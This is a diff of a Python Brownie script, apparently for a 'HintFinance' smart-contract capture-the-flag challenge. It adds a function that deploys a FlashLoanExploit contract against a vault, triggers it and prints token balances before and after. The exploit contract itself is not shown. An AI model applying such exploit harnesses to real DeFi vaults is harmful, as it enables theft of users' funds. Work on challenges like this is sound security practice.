@@ -1,4 +1,7 @@
-from brownie import Setup, HintFinanceFactory, HintFinanceVault, Exploit
+from brownie import (
+    Setup, HintFinanceFactory, HintFinanceVault, Exploit,
+    FlashLoanExploit
+)
 from brownie import accounts, chain, interface
 from web3 import Web3
 
@@ -73,6 +76,18 @@ def hack_test(setuper):
     tx = exploiter.hackEet({'from': acc, 'value': Web3.toWei(1, 'ether')})
     tx.wait(1)
     print(get_formated_token_bals(setuper))
+    print(exploiter.fallbackActivated())
+
+def flash_loan_deposit_hack(setuper):
+    i = 0
+    acc = accounts[0]
+    token = IERC20(setuper.underlyingTokens(i))
+    vault = get_vault_from_setuper(setuper, i)
+    exploiter = FlashLoanExploit.deploy(vault, {'from': acc})
+    print(get_formated_token_bals(setuper))
+    tx = exploiter.hackEet({'from': acc}) 
+    tx.wait(1)
+    print(get_formated_token_bals(setuper))
 
 
 def main():
@@ -80,5 +95,5 @@ def main():
         {'from': accounts[0], 'value': Web3.toWei(30, 'ether')}
     )
     print(get_formated_token_bals(setuper))
-    hack_test(setuper)
+    flash_loan_deposit_hack(setuper)
     
